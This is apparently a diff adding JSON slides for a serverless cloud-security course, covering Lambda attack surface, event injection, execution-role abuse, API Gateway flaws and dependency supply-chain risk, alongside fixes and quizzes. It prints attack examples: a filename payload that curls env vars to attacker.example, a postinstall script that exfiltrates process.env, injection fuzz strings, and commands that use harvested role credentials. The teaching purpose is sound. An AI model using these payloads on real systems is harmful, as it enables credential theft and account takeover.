+            "body": "The exercise and the 'Break It with IMDSv2' lab make hardening verifiable. You take the exact SSRF exploit that stole credentials in the earlier topic and run it again after enforcing IMDSv2 with hop-limit 1. The credentials path now returns 401 instead of keys — the chain is objectively broken.\n\nThen you confirm the other layers: a port sweep from the compromised host can no longer reach the segmented database; an attempt to beacon data out hits the egress filter; and using any creds off-instance raises a GuardDuty finding. The success criterion is concrete: the previously-working exploit fails, and you can point at the specific control that broke each step."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Hardening is only real when you can prove the attack no longer works. That's the discipline this topic instills: for every chain you can execute offensively, know the specific control that neutralizes it and verify it with a re-run, not a checklist tick.\n\nThe layered result is defense in depth. IMDSv2 stops the credential theft; segmentation stops the spread; egress filtering stops the exfiltration; GuardDuty catches the exception. No single control is perfect, but together they turn the catastrophic SSRF-to-cloud-takeover chain — the Capital One pattern — into a dead end. That is the whole point of the module: understand the attack well enough to make it fail reliably."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m8",
+    "name": "Serverless & Event-Driven Security",
+    "shortName": "Serverless Security",
+    "month": 3,
+    "weeks": [
+      3
+    ],
+    "description": "Serverless shifts the attack surface to functions, event sources and their IAM roles. This module covers Lambda security, event-injection, function-role abuse, API Gateway, and the supply-chain and persistence risks unique to FaaS.",
+    "estimatedHours": 10,
+    "outcomes": [
+      "Describe the serverless attack surface: function code, event sources, execution role and dependencies",
+      "Exploit event injection and over-permissioned Lambda execution roles",
+      "Identify insecure API Gateway and authorizer configurations",
+      "Harden functions with least-privilege roles, dependency scanning and runtime controls"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m8-1",
+        "moduleId": "cloud-m8",
+        "number": 46,
+        "title": "The Serverless Attack Surface",
+        "type": "theory",
+        "week": 3,
+        "description": "Reframes security for functions that have no server to patch. The surface becomes code, event data, the execution role and third-party dependencies.",
+        "keyPoints": [
+          "Lambda execution role = what the function can do if compromised",
+          "Event sources (API Gateway, S3, SNS/SQS, EventBridge, DynamoDB streams) as input",
+          "No long-lived host, but ephemeral /tmp and warm-container state reuse",
+          "OWASP Serverless Top 10 framing",
+          "Dependencies pulled at build time as a supply-chain vector"
+        ],
+        "slides": [
+          {
+            "title": "No Server, Still a Target",
+            "body": "Serverless (FaaS, like AWS Lambda) means you upload code and the cloud runs it on demand. There is no server you log into or patch. Analogy: it is a food-truck kitchen the city sets up for 200 milliseconds when an order arrives, then tears down. You never own the truck, but you still own the recipe, the ingredients delivered to it, and the keys it carries. Those three things are your attack surface."
+          },
+          {
+            "title": "Four Things an Attacker Can Touch",
+            "body": "For any function, security collapses to four parts: the code you wrote, the event data that triggers it (untrusted input), the execution role (the IAM identity the function runs as), and the dependencies baked into the bundle. Lose track of any one and the function becomes a foothold. The blast radius at the end is simply whatever the role is allowed to do.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Event source",
+                  "detail": "API Gateway, S3, SNS/SQS, EventBridge, DynamoDB stream"
+                },
+                {
+                  "label": "Event data",
+                  "detail": "Untrusted input the attacker often controls"
+                },
+                {
+                  "label": "Function code",
+                  "detail": "Your logic plus third-party deps"
+                },
+                {
+                  "label": "Execution role",
+                  "detail": "IAM credentials the code can use"
+                },
+                {
+                  "label": "Blast radius",
+                  "detail": "Whatever the role policy permits"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The Execution Role Is the Crown Jewel",
+            "body": "Every Lambda assumes an IAM role at runtime. The role's policy is literally the list of everything the function (and anyone who compromises it) may do in your account. A tiny bug in code that can read S3, write DynamoDB and call iam:* is no longer a tiny bug. Right-sizing this role is the single highest-leverage control in serverless.",
+            "check": {
+              "question": "If an attacker achieves code execution inside a Lambda, what determines how much damage they can do to the AWS account?",
+              "options": [
+                "The function's memory and timeout settings",
+                "The permissions attached to the function's execution role",
+                "The programming language the function uses",
+                "The number of concurrent executions allowed"
+              ],
+              "correctIndex": 1,
+              "explanation": "The execution role is the IAM identity the code runs as. Its policy bounds everything the attacker can reach; memory, language and concurrency affect performance and cost, not authorization."
+            }
+          },
+          {
+            "title": "Event Sources Are Your Input Channels",
+            "body": "A function rarely has just one way in. The same code can be invoked by an HTTP request through API Gateway, a new object in S3, a message on SNS/SQS, an EventBridge rule, or a DynamoDB stream record. Each carries attacker-influenceable fields. A filename in S3, a message body on a queue, or a header through API Gateway all land in your handler's event object as data you must not trust.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "API Gateway (HTTP)",
+                  "points": [
+                    "Path, query, headers, body",
+                    "Directly internet-facing"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "S3 / SNS / SQS",
+                  "points": [
+                    "Object keys, message bodies",
+                    "Often from other systems or users"
+                  ]
+                },
+                {
+                  "label": "EventBridge / DynamoDB stream",
+                  "points": [
+                    "Event detail, changed records",
+                    "Second-order, easy to forget"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Ephemeral, Not Amnesiac",
+            "body": "Lambda containers are short-lived but reused. AWS keeps a warm container alive for minutes and reuses it for the next invoke. That means two things an attacker likes: writable /tmp (up to 10 GB) can hold a dropped tool between invokes, and module-level globals, cached credentials or leftover data from a previous request can bleed into the next. Never store per-request secrets in global variables."
+          },
+          {
+            "title": "OWASP Serverless Top 10 as a Map",
+            "body": "Serverless-specific risk is catalogued in the OWASP Serverless Top 10. The headline items: event injection (untrusted event data into dangerous sinks), broken authentication, over-privileged function permissions and roles, insecure secrets storage, and inadequate function monitoring. If you can recite these you can threat-model any FaaS app. The rest of this module drills each top risk in turn."
+          },
+          {
+            "title": "Mapping a Function's Surface",
+            "body": "Recon starts by reading the function's own definition. The role ARN, the environment variables, the triggers and the layers tell you the blast radius before you send a single payload. A permissive role or a plaintext secret in the environment is a finding on its own.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws lambda get-function --function-name orders-api --profile technieum",
+                  "output": "\"Role\": \"arn:aws:iam::767196576843:role/orders-api-role\",\n\"Environment\": { \"Variables\": { \"DB_PASSWORD\": \"s3cr3t\" } },\n\"Layers\": [ \"arn:aws:lambda:ap-south-1:...:layer:common:7\" ]"
+                },
+                {
+                  "command": "aws iam list-attached-role-policies --role-name orders-api-role --profile technieum",
+                  "output": "\"PolicyName\": \"AdministratorAccess\"   # over-privileged"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Serverless removes host patching but concentrates risk into identity and input. A single injectable field plus an over-broad role is a straight line from an HTTP request to full account takeover: no shell, no persistence on a box, no CVE needed. The rest of this module turns each surface into a concrete attack and then a concrete fix."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m8-2",
+        "moduleId": "cloud-m8",
+        "number": 47,
+        "title": "Event Injection",
+        "type": "lab",
+        "week": 3,
+        "description": "Serverless's SQL-injection analogue. Untrusted event data flowing into dangerous sinks lets attackers run code or commands inside a function.",
+        "keyPoints": [
+          "Untrusted fields from HTTP, S3 keys, SNS messages reaching eval/os.system/db queries",
+          "Command and code injection through event payloads",
+          "NoSQL and SQL injection via event-sourced input",
+          "Deserialization of attacker-controlled event data",
+          "Mitigation: validate/encode all event input, avoid dynamic execution"
+        ],
+        "slides": [
+          {
+            "title": "Injection, Minus the Server",
+            "body": "Event injection is serverless's version of SQL injection or command injection. The twist: the untrusted input doesn't only arrive over HTTP. It can arrive as an S3 object key, an SNS message, a queue body or a DynamoDB record. If any of those fields reaches a dangerous sink (os.system, eval, a raw SQL string, a shell call), the attacker runs code inside your function. Analogy: the function trusts the mail it receives and runs whatever instructions are written on the envelope."
+          },
+          {
+            "title": "Untrusted Field Meets Dangerous Sink",
+            "body": "The bug is always the same shape. An attacker-controlled field in the event object flows, unvalidated, into a function (sink) that executes or interprets it. Developers forget that event['queryStringParameters'] or an S3 key is attacker data because it 'came from AWS'. It did not; AWS merely delivered it.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Attacker",
+                  "detail": "Controls an event field (query param, S3 key, SNS body)"
+                },
+                {
+                  "label": "Event object",
+                  "detail": "event['...'] passed to handler untrusted"
+                },
+                {
+                  "label": "Dangerous sink",
+                  "detail": "os.system / eval / SQL string / pickle.loads"
+                },
+                {
+                  "label": "Code execution",
+                  "detail": "Runs with the function's role"
+                }
+              ]
+            },
+            "check": {
+              "question": "In an event-injection bug, what makes an event field dangerous?",
+              "options": [
+                "It is longer than 256 characters",
+                "It flows unvalidated into a sink that executes or interprets it",
+                "It arrives over HTTPS",
+                "It is stored in DynamoDB"
+              ],
+              "correctIndex": 1,
+              "explanation": "Injection requires untrusted input reaching an execution or interpretation sink. Length, transport and storage are irrelevant; the data-to-sink flow is the bug."
+            }
+          },
+          {
+            "title": "Worked Example: Command Injection via API Gateway",
+            "body": "A thumbnailing Lambda shells out to run a converter, concatenating a user-supplied filename into the command, e.g. os.system(f'convert /tmp/{name} out.png'). The attacker sends a filename containing a shell metacharacter and chains their own command. Because the function's role credentials sit in the environment, the injected command immediately dumps them to an attacker host.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Attacker",
+              "rightLabel": "Lambda (API Gateway)",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "Malicious filename",
+                  "payload": "POST /thumbnail\n{ \"name\": \"x.png; env > /tmp/e; curl -F f=@/tmp/e http://attacker.example/c\" }"
+                },
+                {
+                  "direction": "left",
+                  "label": "Function shells out and exfiltrates",
+                  "payload": "convert /tmp/x.png; env -> /tmp/e; curl ... -> leaks AWS_ACCESS_KEY_ID, AWS_SESSION_TOKEN"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Same Bug, Many Doors",
+            "body": "Event injection generalizes beyond shell. Attacker data in an event can become SQL injection (string-built queries), NoSQL injection (operator injection like $gt in a Mongo filter), code injection (eval / pickle.loads / unsafe yaml.load on an event body), or path traversal (an S3 key like ../../). The source channel changes; the discipline, never let event data reach a sink unescaped, does not.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Command injection",
+                  "points": [
+                    "os.system / subprocess shell=True",
+                    "Shell metacharacters ; | $()"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "SQL / NoSQL",
+                  "points": [
+                    "String-built queries",
+                    "Operator injection $gt, $ne"
+                  ]
+                },
+                {
+                  "label": "Deserialization / code",
+                  "points": [
+                    "pickle.loads, yaml.load, eval",
+                    "Deser of attacker event body"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Finding It",
+            "body": "To spot event injection, trace every field of the event object to where it is used. Grep the code for sinks: os.system, subprocess with shell=True, exec/eval, pickle.loads, unsafe yaml.load, string-formatted SQL, and child_process in Node. For each, ask: can an event field reach here without validation? Dynamic testing: fuzz each input channel with classic payloads (; id, $(id), ' OR '1'='1, {\"$gt\":\"\"}) plus an out-of-band callback (interactsh / Burp Collaborator) to confirm blind execution."
+          },
+          {
+            "title": "Do It: Inject the Function",
+            "body": "In the module lab 'Inject the Function' you attack a Lambda-backed API on AWS free tier. Send a payload into the vulnerable field, confirm command execution with an out-of-band DNS/HTTP callback, then escalate: read the function's own role credentials straight from the runtime environment and use them from your own machine. That pivot, injection to stolen role credentials, is the whole point.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "curl -s https://api.lab.example/thumbnail -d '{\"name\":\"x; env\"}'",
+                  "output": "AWS_ACCESS_KEY_ID=ASIA...\nAWS_SECRET_ACCESS_KEY=...\nAWS_SESSION_TOKEN=IQoJ...\nAWS_LAMBDA_FUNCTION_NAME=thumb"
+                },
+                {
+                  "command": "AWS_ACCESS_KEY_ID=ASIA... aws sts get-caller-identity",
+                  "output": "\"Arn\": \"arn:aws:sts::...:assumed-role/thumb-role/thumb\""
+                }
+              ]
+            }
+          },
+          {
+            "title": "Fix It",
+            "body": "The durable fix is to never build an executable string from event data. Replace shell-outs with library calls or pass arguments as an argv array (subprocess.run([...], shell=False)). Use parameterized queries for SQL and typed filters for NoSQL. Never deserialize untrusted bytes with pickle or yaml.load; use JSON with a strict schema. Add schema validation at the boundary (JSON Schema, pydantic, API Gateway request validators) so malformed events are rejected before your code runs.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Event in",
+                  "detail": "Validate against strict schema"
+                },
+                {
+                  "label": "Reject bad input",
+                  "detail": "Type, length, allowlist at boundary"
+                },
+                {
+                  "label": "Safe sink",
+                  "detail": "argv array, parameterized query, JSON parse"
+                },
+                {
+                  "label": "No dynamic exec",
+                  "detail": "No eval / pickle / shell=True"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Event injection is the fastest path from an open endpoint to credentials in your AWS account, and it is often blind: the attacker never needs to see output, only to make the function beacon out. Because many event sources are not internet-facing, teams under-test them, so S3- and queue-triggered injection frequently ships to production. One unescaped field plus a broad role equals account compromise."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m8-3",
+        "moduleId": "cloud-m8",
+        "number": 48,
+        "title": "Execution-Role Abuse",
+        "type": "lab",
+        "week": 3,
+        "description": "A compromised function inherits its role. Over-broad Lambda roles turn a code bug into account compromise, and the function itself is a privilege-escalation sink.",
+        "keyPoints": [
+          "Reading the function's own credentials from the runtime environment variables",
+          "Over-permissive roles granting S3/DynamoDB/IAM beyond the function's need",
+          "Lambda as a PassRole sink (covered in IAM module) for escalation",
+          "Persistence by modifying function code (lambda:UpdateFunctionCode)",
+          "Mitigation: one tightly-scoped role per function"
+        ],
+        "slides": [
+          {
+            "title": "The Function Carries Keys",
+            "body": "Every Lambda runs as an IAM role, and the role's temporary credentials are handed to the running code. Compromise the code and you inherit those keys instantly, with no password and no theft of long-lived secrets. Analogy: breaking into the delivery van also hands you the master key ring the company left on the dashboard. How many doors that ring opens depends entirely on how the role was scoped."
+          },
+          {
+            "title": "Where the Credentials Live",
+            "body": "AWS injects the role's temporary credentials into the function's environment as AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY and AWS_SESSION_TOKEN. Any code execution, even a read primitive that prints os.environ, hands the attacker a working session they can export and use from their own laptop until the token expires. Unlike EC2, there is no instance metadata service; the environment is the source.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Code exec in Lambda",
+                  "detail": "Even just printing env vars"
+                },
+                {
+                  "label": "Read AWS_* env",
+                  "detail": "Access key, secret, session token"
+                },
+                {
+                  "label": "Export locally",
+                  "detail": "Use creds from attacker machine"
+                },
+                {
+                  "label": "Act as the role",
+                  "detail": "Every API the policy allows"
+                }
+              ]
+            },
+            "check": {
+              "question": "Where does a compromised Lambda most directly obtain AWS credentials to use elsewhere?",
+              "options": [
+                "From the EC2 instance metadata service at 169.254.169.254",
+                "From the AWS_ACCESS_KEY_ID / AWS_SESSION_TOKEN environment variables injected by the runtime",
+                "From a hardcoded IAM user in the code",
+                "From the API Gateway authorizer"
+              ],
+              "correctIndex": 1,
+              "explanation": "Lambda injects the execution role's temporary credentials into the function's environment variables. There is no EC2-style IMDS endpoint in Lambda."
+            }
+          },
+          {
+            "title": "Worked Example: Harvest and Pivot",
+            "body": "Given any code-exec or env-read primitive, the attacker exports the three variables and queries their own identity and permissions. sts get-caller-identity confirms the assumed role; then they enumerate what it can reach. If the role has s3:ListAllMyBuckets or IAM permissions, the blast radius is immediately obvious.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "export AWS_ACCESS_KEY_ID=ASIA... AWS_SESSION_TOKEN=IQoJ...",
+                  "output": ""
+                },
+                {
+                  "command": "aws sts get-caller-identity",
+                  "output": "\"Arn\": \"arn:aws:sts::767196576843:assumed-role/report-fn-role/report-fn\""
+                },
+                {
+                  "command": "aws s3 ls",
+                  "output": "2026-01-02 customer-pii-prod\n2026-01-02 billing-exports"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The Shapes of an Over-Broad Role",
+            "body": "Most dangerous roles were not meant to be dangerous; they grew wildcards for convenience. Watch for Action: s3:* or Resource: * (should be one bucket ARN), AdministratorAccess attached 'to get it working', iam:PassRole with a broad resource (a privilege-escalation launchpad), and lambda:UpdateFunctionCode on the function itself (persistence). The need was 'read one bucket'; the grant was 'the whole account'.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Least privilege (good)",
+                  "points": [
+                    "s3:GetObject on arn:...:one-bucket/*",
+                    "No iam:*, no wildcards"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Over-broad (bad)",
+                  "points": [
+                    "s3:* on Resource: *",
+                    "AdministratorAccess / iam:PassRole *"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "From Access to Persistence and Escalation",
+            "body": "A role is not just a reading tool, it is an escalation sink. iam:PassRole plus lambda:CreateFunction/UpdateFunctionCode lets an attacker run their own code as a more privileged role (covered in the IAM module). lambda:UpdateFunctionCode on the current function is quiet persistence: overwrite the function with a backdoor that triggers on every normal invoke. Because the host is managed by AWS, this code-level persistence is easy to miss.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "a",
+                  "label": "Compromised fn role",
+                  "highlighted": true
+                },
+                {
+                  "id": "b",
+                  "label": "iam:PassRole + lambda:*"
+                },
+                {
+                  "id": "c",
+                  "label": "Run code as admin role"
+                },
+                {
+                  "id": "d",
+                  "label": "UpdateFunctionCode"
+                },
+                {
+                  "id": "e",
+                  "label": "Backdoored function (persistence)"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "a",
+                  "to": "b",
+                  "label": "has"
+                },
+                {
+                  "from": "b",
+                  "to": "c",
+                  "label": "escalate"
+                },
+                {
+                  "from": "a",
+                  "to": "d",
+                  "label": "has"
+                },
+                {
+                  "from": "d",
+                  "to": "e",
+                  "label": "persist"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Finding It",
+            "body": "Audit roles, not just code. Pull each function's role and its policies and flag wildcards with aws iam list-attached-role-policies and get-role-policy, looking for Action/Resource '*'. Tools: IAM Access Analyzer (unused-access findings), Prowler and ScoutSuite for account-wide role review, and Cloudsplaining to rank policies by privilege-escalation risk. Offensively, after landing creds, enumerate with enumerate-iam or Pacu's IAM modules to learn the role's real reach."
+          },
+          {
+            "title": "Do It: Lambda Role Breakout",
+            "body": "The hard lab 'Lambda Role Breakout' (CloudGoat lambda scenario) starts you with a foothold in an over-permissioned function. You harvest the role creds, enumerate the policy, find an escalation path (often iam:PassRole or an over-broad data action), pivot to broader account access, then re-scope the role and prove the pivot now fails. Fixing it is part of the grade.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam list-attached-role-policies --role-name report-fn-role",
+                  "output": "AdministratorAccess"
+                },
+                {
+                  "command": "aws iam put-role-policy ... (replace with scoped policy)",
+                  "output": "# role now: s3:GetObject on one bucket only"
+                },
+                {
+                  "command": "aws s3 ls   # retry with harvested creds",
+                  "output": "An error occurred (AccessDenied) ... pivot blocked"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Fix It: One Tight Role per Function",
+            "body": "The rule is one dedicated, least-privilege role per function, scoped to specific resource ARNs and specific actions, never shared and never wildcarded. Deny iam:* and lambda:UpdateFunctionCode unless the function genuinely needs them. Use IAM Access Analyzer to generate a policy from observed CloudTrail activity so the grant matches real usage. Keep secrets in Secrets Manager or SSM Parameter Store fetched via the role, not in plaintext environment variables."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Execution-role abuse is why a single serverless bug becomes an account breach. The credentials are free to the attacker, pre-authenticated, and scoped by a policy a developer wrote in a hurry. The 'SSRF/injection to Lambda role to S3 data' pattern mirrors classic EC2 metadata breaches such as Capital One. Scoping the role is the control that caps the whole chain."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m8-4",
+        "moduleId": "cloud-m8",
+        "number": 49,
+        "title": "API Gateway & Authorizers",
+        "type": "theory",
+        "week": 3,
+        "description": "The front door to most serverless apps. Misconfigured routes, authorizers and CORS expose functions directly.",
+        "keyPoints": [
+          "Missing/weak authorizers (Lambda authorizer, Cognito, IAM) on routes",
+          "Caching of authorizer decisions enabling token replay",
+          "Over-permissive CORS and mass-assignment through proxy integrations",
+          "Rate-limiting / throttling absence enabling abuse and cost attacks",
+          "Resource policy vs authorizer and when each applies"
+        ],
+        "slides": [
+          {
+            "title": "The Front Door",
+            "body": "Amazon API Gateway is the HTTP front door that maps public routes to backend Lambdas. It decides who gets in (authorizers), what shape requests must have (validation), and how fast callers may knock (throttling). Analogy: it is the reception desk of the building. If reception waves everyone through, checks a forged badge once and remembers it all day, or never limits the queue, the offices behind it are exposed no matter how well each office is locked."
+          },
+          {
+            "title": "How a Request Flows Through",
+            "body": "For each route, API Gateway runs a pipeline: match the route and method, run the authorizer (Lambda authorizer, Cognito user-pool, or IAM/SigV4), optionally validate the request against a model, then forward to the integration (usually a Lambda). A gap at any stage, no authorizer, no validation, or a proxy integration that forwards everything, becomes an exposure.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Route match",
+                  "detail": "METHOD + path, e.g. GET /orders/{id}"
+                },
+                {
+                  "label": "Authorizer",
+                  "detail": "Lambda / Cognito / IAM, may be missing"
+                },
+                {
+                  "label": "Request validation",
+                  "detail": "Model/schema, often skipped"
+                },
+                {
+                  "label": "Integration",
+                  "detail": "Proxy to Lambda / HTTP backend"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Missing or Weak Authorizers",
+            "body": "The most common finding: a route ships with authorizationType NONE, or a sensitive admin route is simply never given an authorizer. Attackers enumerate every method on every path (OPTIONS often reveals routes) and hit them unauthenticated. A Lambda authorizer that returns Allow on a malformed or empty token (fail-open logic) is just as bad as having none.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Attacker",
+              "rightLabel": "API Gateway",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "No token sent",
+                  "payload": "GET /admin/users HTTP/1.1\nHost: api.example.com"
+                },
+                {
+                  "direction": "left",
+                  "label": "200 OK (no authorizer on route)",
+                  "payload": "[ {\"user\":\"alice\",\"role\":\"admin\"}, ... ]"
+                }
+              ]
+            },
+            "check": {
+              "question": "A Lambda authorizer returns an Allow policy when it receives an empty or malformed token. What is this?",
+              "options": [
+                "Correct fail-closed behavior",
+                "A fail-open authorization flaw equivalent to having no auth",
+                "A CORS misconfiguration",
+                "A throttling problem"
+              ],
+              "correctIndex": 1,
+              "explanation": "Authorizers must fail closed, denying on any error or missing/invalid token. Returning Allow on bad input is fail-open and lets anyone through."
+            }
+          },
+          {
+            "title": "Authorizer Caching and Token Replay",
+            "body": "To save money, API Gateway caches an authorizer's Allow/Deny decision keyed by the token (identity source) for a TTL you set (authorizerResultTtlInSeconds, up to 3600s). Two problems: a token valid at minute 0 keeps being accepted for the whole TTL even after revocation, and if the cache key is a header the attacker can set, a stolen or replayed token is honored without re-checking. Keep the TTL short for sensitive APIs and key the cache on the full, correct identity source."
+          },
+          {
+            "title": "CORS and Mass-Assignment",
+            "body": "Two proxy-integration pitfalls. First, over-permissive CORS, Access-Control-Allow-Origin: * combined with credentials, or reflecting any Origin, lets malicious sites call the API with a victim's session. Second, AWS_PROXY (Lambda proxy) integration forwards the entire request body straight to your code. If the handler spreads that body into a database update, an attacker adds fields the form never showed, which is mass assignment.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Attacker",
+              "rightLabel": "Lambda (proxy)",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "Extra field in body",
+                  "payload": "PUT /profile\n{ \"name\": \"bob\", \"role\": \"admin\", \"isVerified\": true }"
+                },
+                {
+                  "direction": "left",
+                  "label": "Handler spreads body into DynamoDB update",
+                  "payload": "UpdateItem { name, role:'admin', isVerified:true }  # privilege granted"
+                }
+              ]
+            }
+          },
+          {
+            "title": "No Throttling = Cost and Abuse",
+            "body": "API Gateway can throttle per-route and per-key, but if limits are left at the account default (or unset), a function behind it can be invoked as fast as an attacker can send requests. That is both denial-of-service and denial-of-wallet: every invoke costs money and can fan out to paid downstream services. Set route-level throttling, usage plans with API keys for partners, and reserved concurrency on the Lambda so one route cannot starve the account."
+          },
+          {
+            "title": "Resource Policy vs Authorizer",
+            "body": "These solve different problems and you often want both. A resource policy is network/principal-level: it decides which source IPs, VPCs or AWS accounts may reach the API at all (e.g. private APIs locked to a VPC endpoint). An authorizer is request-level: it decides whether this caller, with this token, may use this route. The resource policy is the moat; the authorizer is the ID check at the desk. Using only one leaves the other gap open."
+          },
+          {
+            "title": "Find and Test It",
+            "body": "Export the API definition and read it. aws apigateway get-resources / get-method shows authorizationType per route; grep for NONE on anything sensitive, and check for AWS_IAM or CUSTOM where expected. Then probe live: enumerate methods, send requests with no token, an expired token, and another tenant's token; test CORS with an evil Origin; and fuzz extra JSON fields for mass assignment.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws apigateway get-method --rest-api-id a1b2 --resource-id r9 --http-method GET --query authorizationType",
+                  "output": "\"NONE\"   # unauthenticated sensitive route"
+                },
+                {
+                  "command": "curl -i https://api.example.com/admin/users",
+                  "output": "HTTP/1.1 200 OK  # confirmed, no auth required"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Harden It and Why It Matters",
+            "body": "Require an authorizer (Cognito, Lambda, or IAM) on every non-public route and make authorizers fail closed. Attach request validators and JSON Schema models so malformed bodies are rejected before Lambda runs. Restrict CORS to known origins, never '*' with credentials. Set throttling and usage plans, and add a resource policy for network scoping. API Gateway is the most exposed component in a serverless app: one route with authorizationType NONE can expose every function behind it, so it deserves the most scrutiny."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m8-5",
+        "moduleId": "cloud-m8",
+        "number": 50,
+        "title": "Dependency & Supply-Chain Risk",
+        "type": "theory",
+        "week": 3,
+        "description": "Functions ship with their dependency tree. A malicious or vulnerable package runs with the function's role.",
+        "keyPoints": [
+          "Vulnerable packages in the deployment bundle and Lambda layers",
+          "Typosquatting and dependency confusion in npm/PyPI",
+          "Scanning bundles and layers (Snyk, Trivy, npm audit) in CI",
+          "Pinning and lockfiles; verifying layer provenance",
+          "SBOM generation for serverless artifacts"
+        ],
+        "slides": [
+          {
+            "title": "You Ship Everyone's Code",
+            "body": "A function is rarely just your code. npm install or pip install pulls a tree of third-party packages into the deployment bundle, and Lambda layers add shared libraries on top. Every one of those packages runs inside your function, with your execution role. Analogy: you hired one contractor, but they brought twenty subcontractors you never vetted, and you handed all of them the building's keys."
+          },
+          {
+            "title": "Where the Risk Executes",
+            "body": "The danger is not abstract. A malicious package's code runs at import time (or in a build hook) inside the same process as your handler. It can read the AWS_* credentials from the environment, exfiltrate your event data, or beacon out, all under the function's identity. There is no sandbox between 'your code' and 'the dependency'; it is one runtime.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "CI build",
+                  "detail": "npm/pip install pulls deps + hooks"
+                },
+                {
+                  "label": "Bundle / layer",
+                  "detail": "Third-party code packaged with yours"
+                },
+                {
+                  "label": "Function runtime",
+                  "detail": "Dep code imported in your process"
+                },
+                {
+                  "label": "Role abuse",
+                  "detail": "Reads env creds, exfiltrates data"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Malicious Install Hook",
+            "body": "npm packages can run scripts on install (preinstall/postinstall). A trojaned or compromised package, the pattern behind the event-stream incident and many later npm compromises, runs code during your CI build or first use. In serverless it is worse: the same code also runs in the function. A compromised package can simply read process.env and POST the role credentials to an attacker host.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "cat node_modules/left-pad-helper/postinstall.js",
+                  "output": "require('https').get('https://attacker.example/c?d='+Buffer.from(JSON.stringify(process.env)).toString('base64'))"
+                },
+                {
+                  "command": "# runs in CI AND in the Lambda -> leaks AWS_SESSION_TOKEN",
+                  "output": ""
+                }
+              ]
+            }
+          },
+          {
+            "title": "Dependency Confusion",
+            "body": "If your build resolves packages from both a public registry and a private one by name alone, an attacker who publishes a public package with the same name as your internal one, and a higher version number, can get the installer to pull theirs. This is dependency confusion (Alex Birsan, 2021). The malicious public internal-utils@99.0.0 wins the version race and runs in your pipeline and functions.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Expected (private)",
+                  "points": [
+                    "internal-utils@1.2.0 from company registry"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Attack (public)",
+                  "points": [
+                    "internal-utils@99.0.0 on npmjs.com",
+                    "Higher version resolves first"
+                  ]
+                }
+              ]
+            },
+            "check": {
+              "question": "What makes dependency confusion possible?",
+              "options": [
+                "Pinning every dependency by hash",
+                "The installer resolving a name from a public registry when a private package of the same name exists, preferring the higher version",
+                "Using a lockfile",
+                "Disabling postinstall scripts"
+              ],
+              "correctIndex": 1,
+              "explanation": "When name resolution spans public and private sources without scoping, a public package with the same name and a higher version is chosen, running attacker code. Pinning and lockfiles defend against it."
+            }
+          },
+          {
+            "title": "Lambda Layers and Provenance",
+            "body": "Lambda layers let teams share common libraries across functions, including public and third-party layers referenced by ARN. A layer you did not build is code you did not review running with every function's role. Layer ARNs can also be shared cross-account, so a convenient community layer is an unvetted supply-chain dependency. Treat layers like packages: know who publishes them, pin the exact version, and prefer layers you build and sign yourself."
+          },
+          {
+            "title": "Scanning in CI",
+            "body": "You cannot review every transitive dependency by hand, so scan automatically and fail the build on criticals. Software Composition Analysis tools, Snyk, Trivy, npm audit, pip-audit and OWASP Dependency-Check, compare your lockfile against vulnerability databases. Run them in CI on the exact artifact you deploy, including the bundle and layers, not just the top-level manifest.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
